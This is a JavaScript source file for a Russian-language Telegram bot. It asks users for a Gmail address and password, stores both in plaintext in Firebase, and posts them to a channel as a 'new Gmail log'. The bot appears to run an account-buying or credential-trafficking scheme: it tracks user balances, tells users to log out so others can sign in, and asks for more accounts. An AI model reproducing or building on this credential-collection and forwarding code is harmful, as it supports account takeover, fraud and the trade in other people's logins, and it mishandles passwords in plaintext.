const { Markup, Composer, Scenes } = require('telegraf');
const { channelid } = require('./config');
const { ref, get, child, set, update } = require('firebase/database');
const db = require('./bd');
const accountscenes = new Scenes.WizardScene('accountscenes', 
   async (ctx) => {
    try {let gmail = ctx.message.text
    if(gmail.length >= 18) {
    let balance = await get(child(ref(db), "users/" + ctx.chat.id + '/balance/'))
    balance = balance.val();
    let ban = await get(child(ref(db), "users/" + ctx.chat.id + '/ban/'))
    ban = ban.val();
    await update(child(ref(db), 'users/' + ctx.chat.id), {'username': '@' + ctx.chat.username, 'balance': balance, 'id': '', 'account': gmail, 'password': '', 'ban': ban})
    const inkeboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    {text: '❌Закрыть', callback_data: 'close'}
                ],
            ],
        }, parse_mode: 'Markdown'
    }
    ctx.reply('Отправьте мне пароль в таком формате:\n\n`password12345`', inkeboard)
    } else {
        ctx.reply('Ошибка - Почта введена не правильно!')
        ctx.scene.leave()
    }} catch {
        if(ctx.message == undefined) {
            ctx.deleteMessage();
            ctx.reply('Сообщение закрыто')
            ctx.scene.leave()
        } else {
        ctx.reply('Ошибка! Бот принимает только текстовые сообщения')
        ctx.scene.leave()
        }
    }
   ctx.wizard.next();
}, async (ctx) => {
    try {let password = ctx.message.text
    if (password.length >= 8) {
    let username = await get(child(ref(db), "users/" + ctx.chat.id + '/username/'))
    username = username.val();
    let ban = await get(child(ref(db), "users/" + ctx.chat.id + '/ban/'))
    ban = ban.val();
    let balance = await get(child(ref(db), "users/" + ctx.chat.id + '/balance/'))
    balance = balance.val();
    let gmail = await get(child(ref(db), "users/" + ctx.chat.id + '/account/'))
    gmail = gmail.val();
    await update(child(ref(db), 'users/' + ctx.chat.id), {'username': '@' + ctx.chat.username, 'balance': balance, 'id': '', 'account': gmail, 'password': password, 'ban': ban})
    ctx.reply('Отлично, аккаунт отправлен на проверку, ожидайте!\n\nНе забудьте выйти с аккаунта, чтобы не возникло проблем с входом.\n\nБудем ждать от тебя еще аккаунтов :)')
    ctx.telegram.sendMessage(channelid,'🔔 *Поздравляю! Новый лог Gmail!*\n\nПочта: `' + gmail + '`\nПароль: `' + password + '`\n\nTag Telegram - ' + username + '\nID - `' + ctx.chat.id + '`', {parse_mode: 'Markdown'})
    } else {
        ctx.reply('Ошибка - Неверный пароль')
    }
    ctx.scene.leave()
} catch {
    if(ctx.message == undefined) {
        ctx.deleteMessage();
        ctx.reply('Сообщение закрыто')
            ctx.scene.leave()
    }
    ctx.reply('Ошибка! Бот принимает только текстовые сообщения')
    ctx.scene.leave()
}
})
accountscenes.enter( async (ctx) => {
    let ban = await get(child(ref(db), "users/" + ctx.chat.id + '/ban/'))
    ban = ban.val();
    if(ban == 1) {
        ctx.reply('Доступ запрещен!\n\nВы были заблокированы в боте')
        ctx.scene.leave();
    } else {
        const inkeyboard = {
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '❌Закрыть', callback_data: 'close'}
                    ],
                ],
            }, parse_mode: 'Markdown'
        }
    ctx.editMessageText('Отправь мне почту в таком формате:\n\n`google@gmail.com`', inkeyboard);
}})
module.exports = accountscenes;